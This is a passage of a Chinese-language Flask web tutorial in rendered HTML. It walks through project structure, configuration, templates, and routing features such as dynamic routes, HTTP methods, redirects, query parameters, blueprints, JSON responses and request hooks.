punctuation">.</span>from_object<span class="token punctuation">(</span><span class="token string">'config.Config'</span><span class="token punctuation">)</span>  <span class="token comment"># 加载配置</span>    <span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 导入并注册路由</span>        <span class="token keyword">from</span> <span class="token punctuation">.</span> <span class="token keyword">import</span> routes        <span class="token keyword">return</span> app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>说明</strong>：<code>create_app</code> 函数用于创建和配置应用实例。<code>app.app_context()</code> 确保在应用上下文中导入路由。</li></ul><h4 id="app-routes-py"><a href="#app-routes-py" class="headerlink" title="app/routes.py"></a><code>app/routes.py</code></h4><p>定义项目的路由，所有路由相关的逻辑放在这个文件中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> current_app <span class="token keyword">as</span> app<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>说明</strong>：<code>app.route('/')</code> 是根路径的路由，返回 <code>index.html</code> 模板页面。</li></ul><h4 id="app-models-py-（可选）"><a href="#app-models-py-（可选）" class="headerlink" title="app/models.py （可选）"></a><code>app/models.py</code> （可选）</h4><p>如果项目需要数据库模型，可以在此文件中定义。例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="config-py"><a href="#config-py" class="headerlink" title="config.py"></a><code>config.py</code></h4><p>配置文件，用于管理全局配置（例如密钥、数据库 URI 等）。将敏感信息存储在环境变量中更安全。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'your_secret_key'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'sqlite:///site.db'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-templates-index-html"><a href="#app-templates-index-html" class="headerlink" title="app/templates/index.html"></a><code>app/templates/index.html</code></h4><p>HTML 模板文件示例。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>My Flask App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for('static', filename='css/style.css') }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Welcome to My Flask App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hello, Flask with modular structure!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for('static', filename='js/script.js') }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-static-css-style-css"><a href="#app-static-css-style-css" class="headerlink" title="app/static/css/style.css"></a><code>app/static/css/style.css</code></h4><p>简单的 CSS 文件，用于为页面增加样式。</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* static/css/style.css */</span><span class="token selector">body</span> <span class="token punctuation">{</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #f0f0f0<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-static-js-script-js"><a href="#app-static-js-script-js" class="headerlink" title="app/static/js/script.js"></a><code>app/static/js/script.js</code></h4><p>简单的 JavaScript 文件。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// static/js/script.js</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Welcome to My Flask App with modular structure!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="run-py"><a href="#run-py" class="headerlink" title="run.py"></a><code>run.py</code></h4><p>项目的启动文件，通过调用 <code>create_app</code> 函数启动应用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> app <span class="token keyword">import</span> create_appapp <span class="token operator">=</span> create_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>说明</strong>：<code>run.py</code> 是整个项目的入口文件，使用 <code>app.run(debug=True)</code> 启动应用程序。</li></ul><h4 id="requirements-txt"><a href="#requirements-txt" class="headerlink" title="requirements.txt"></a><code>requirements.txt</code></h4><p>包含项目依赖。</p><h3 id="大型"><a href="#大型" class="headerlink" title="大型"></a>大型</h3><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">my_flask_project/├── app/│   ├── __init__.py           # 初始化应用程序和配置│   ├── routes.py             # 路由定义│   ├── models.py             # 数据库模型定义│   ├── templates/            # HTML 模板文件│   │   └── base.html│   ├── static/               # 静态文件（CSS、JS、图片等）│   │   ├── css/│   │   │   └── style.css│   │   ├── js/│   │   └── images/│   └── blueprints/           # 各个功能模块的蓝图│       ├── __init__.py│       ├── user/             # 用户模块│       │   ├── __init__.py│       │   ├── routes.py│       │   └── templates/│       └── admin/            # 管理员模块│           ├── __init__.py│           ├── routes.py│           └── templates/├── migrations/               # 数据库迁移文件（使用 Flask-Migrate）├── tests/                    # 测试代码│   ├── __init__.py│   └── test_app.py├── config.py                 # 配置文件├── manage.py                 # 启动、管理和迁移命令└── requirements.txt          # 依赖包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>**<code>app/</code>**：主要应用程序文件夹，包含所有核心代码。</p><ul><li>**<code>__init__.py</code>**：初始化 Flask 应用、加载配置和注册蓝图。</li><li>**<code>routes.py</code>**：定义全局路由。</li><li>**<code>models.py</code>**：定义数据库模型。</li><li>**<code>templates/</code>**：存储 HTML 模板。</li><li>**<code>static/</code>**：存储静态文件，如 CSS、JavaScript 和图片。</li><li>**<code>blueprints/</code>**：存储不同功能模块的蓝图，每个模块可以有自己的 <code>routes.py</code> 和 <code>templates/</code> 文件夹。</li></ul><p>**<code>migrations/</code>**：数据库迁移文件（如使用 Flask-Migrate 时生成）。</p><p>**<code>tests/</code>**：测试文件夹，用于单元测试或集成测试。</p><p>**<code>config.py</code>**：存储配置文件，如数据库连接和应用的全局设置。</p><p>**<code>manage.py</code>**：用于管理项目的文件，可添加自定义命令，如启动服务器、初始化数据库等。</p><p>**<code>requirements.txt</code>**：记录项目的所有依赖包。</p></li></ul><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><h3 id="1-基本路由"><a href="#1-基本路由" class="headerlink" title="1. 基本路由"></a>1. 基本路由</h3><p>最简单的路由是将一个 URL 映射到一个视图函数。可以使用 <code>@app.route()</code> 装饰器来定义路由。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Welcome to the homepage!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/about'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"This is the about page."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>@app.route('/')</code>：当用户访问根路径（如 <code>http://localhost:5000/</code>）时，执行 <code>home</code> 函数。</li><li><code>@app.route('/about')</code>：访问 <code>/about</code> 时，执行 <code>about</code> 函数。</li></ul><h3 id="2-动态路由"><a href="#2-动态路由" class="headerlink" title="2. 动态路由"></a>2. 动态路由</h3><p>可以在路由中添加动态部分，用来接收 URL 中的参数。动态部分用尖括号 <code>&lt;...&gt;</code> 表示，Flask 会自动将 URL 中的值传递给视图函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>访问 <code>/user/john</code> 时，会输出 <code>Hello, john!</code>。</li><li><code>&lt;username&gt;</code> 是一个动态参数，视图函数 <code>show_user</code> 将接收 <code>username</code> 的值。</li></ul><h4 id="指定数据类型"><a href="#指定数据类型" class="headerlink" title="指定数据类型"></a>指定数据类型</h4><p>默认情况下，Flask 会将 URL 参数作为字符串处理。如果需要其他类型的数据，可以在尖括号内指定：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/post/&lt;int:post_id&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Post ID is </span><span class="token interpolation"><span class="token punctuation">{</span>post_id<span class="token punctuation">}</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>&lt;int:post_id&gt;</code> 指定了 <code>post_id</code> 必须是整数，访问 <code>/post/5</code> 会返回 <code>Post ID is 5</code>。</li><li>常用的数据类型有：<ul><li><code>&lt;int:variable&gt;</code>：整数</li><li><code>&lt;float:variable&gt;</code>：浮点数</li><li><code>&lt;path:variable&gt;</code>：字符串（允许包含 <code>/</code>）</li></ul></li></ul><h3 id="3-多种请求方法"><a href="#3-多种请求方法" class="headerlink" title="3. 多种请求方法"></a>3. 多种请求方法</h3><p>默认情况下，Flask 路由只响应 <code>GET</code> 请求。如果需要处理其他 HTTP 方法（如 <code>POST</code>、<code>PUT</code>、<code>DELETE</code> 等），可以通过 <code>methods</code> 参数指定。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Form submitted!"</span>    <span class="token keyword">return</span> <span class="token string">"Please submit the form."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>methods=['GET', 'POST']</code>：允许 <code>submit</code> 路由响应 <code>GET</code> 和 <code>POST</code> 请求。</li><li>使用 <code>request.method</code> 判断请求类型并做不同的处理。</li></ul><h3 id="4-路由别名（URL-别名）"><a href="#4-路由别名（URL-别名）" class="headerlink" title="4. 路由别名（URL 别名）"></a>4. 路由别名（URL 别名）</h3><p>可以使用 <code>url_for</code> 函数生成路由的 URL，避免硬编码 URL。在视图函数上使用 <code>endpoint</code> 参数，可以给路由一个别名，用于简化 <code>url_for</code> 函数调用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/&lt;username&gt;'</span><span class="token punctuation">,</span> endpoint<span class="token operator">=</span><span class="token string">'user_profile'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User: </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token comment"># 使用 url_for 动态生成 URL</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/redirect_to_profile'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redirect_to_profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'user_profile'</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">'john'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>访问 <code>/redirect_to_profile</code> 会重定向到 <code>/profile/john</code>。</li></ul><h3 id="5-重定向与错误处理"><a href="#5-重定向与错误处理" class="headerlink" title="5. 重定向与错误处理"></a>5. 重定向与错误处理</h3><p>可以通过 <code>redirect</code> 实现重定向，或用 <code>abort</code> 函数处理错误。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token punctuation">,</span> abort<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old-url'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 重定向到新的 URL</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'new_url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/new-url'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">new_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"This is the new URL."</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>  <span class="token comment"># 返回 403 错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>redirect(url_for('new_url'))</code>：将用户重定向到 <code>new_url</code> 视图。</li><li><code>abort(403)</code>：返回 403 错误页面。</li></ul><h3 id="6-带查询参数的路由"><a href="#6-带查询参数的路由" class="headerlink" title="6. 带查询参数的路由"></a>6. 带查询参数的路由</h3><p>查询参数一般附加在 URL 的末尾，例如 <code>http://localhost:5000/search?query=flask</code>。可以通过 <code>request.args</code> 获取这些参数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Search results for: </span><span class="token interpolation"><span class="token punctuation">{</span>query<span class="token punctuation">}</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>request.args.get('query')</code>：获取查询参数 <code>query</code> 的值。</li></ul><h3 id="7-路由分组（蓝图）"><a href="#7-路由分组（蓝图）" class="headerlink" title="7. 路由分组（蓝图）"></a>7. 路由分组（蓝图）</h3><p>如果应用较大，可以将路由划分为不同的模块（称为“蓝图”），以提高代码组织性。以下是一个简单的蓝图示例。</p><h4 id="创建蓝图文件-app-user-py："><a href="#创建蓝图文件-app-user-py：" class="headerlink" title="创建蓝图文件 app/user.py："></a>创建蓝图文件 <code>app/user.py</code>：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Blueprintuser_bp <span class="token operator">=</span> Blueprint<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@user_bp<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/&lt;username&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User Profile for </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="注册蓝图到应用中-app-init-py："><a href="#注册蓝图到应用中-app-init-py：" class="headerlink" title="注册蓝图到应用中 app/__init__.py："></a>注册蓝图到应用中 <code>app/__init__.py</code>：</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> <span class="token punctuation">.</span>user <span class="token keyword">import</span> user_bp<span class="token keyword">def</span> <span class="token function">create_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>    app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>user_bp<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/user'</span><span class="token punctuation">)</span>  <span class="token comment"># 注册蓝图</span>    <span class="token keyword">return</span> app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>url_prefix='/user'</code>：访问 <code>/user/&lt;username&gt;</code> 时，会调用 <code>user_bp</code> 蓝图中的 <code>profile</code> 路由。</li><li>蓝图让大型应用代码更清晰。</li></ul><h3 id="8-格式化"><a href="#8-格式化" class="headerlink" title="8. 格式化"></a>8. 格式化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/json'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">json_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Flask"</span><span class="token punctuation">,</span> <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"2.0"</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-视图函数的装饰器"><a href="#9-视图函数的装饰器" class="headerlink" title="9.视图函数的装饰器"></a>9.视图函数的装饰器</h3><p>除了 @app.route，Flask 还支持其他装饰器，用于实现更复杂的功能。</p><ul><li>**<code>@app.before_request</code>**：在每个请求处理之前运行的函数。</li><li>**<code>@app.after_request</code>**：在每个请求处理之后运行的函数。</li><li>**<code>@app.teardown_request</code>**：在请求结束后运行的函数，用于清理工作。</li></ul><p>示例装饰器使用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span><span class="token keyword">def</span> <span class="token function">before_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Before request'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">after_request</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'After request'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>teardown_request</span><span class="token keyword">def</span> <span class="token function">teardown_request</span><span class="token punctuation">(</span>exception<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Teardown request'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><p>以下是一个包含多种路由定义方式的完整示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Welcome to the homepage!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/post/&lt;int:post_id&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_post</span><span class="token punctuation">(</span>post_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Post ID is </span><span class="token interpolation"><span class="token punctuation">{</span>post_id<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Form submitted!"</span>    <span class="token keyword">return</span> <span class="token string">"Please submit the form."</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token 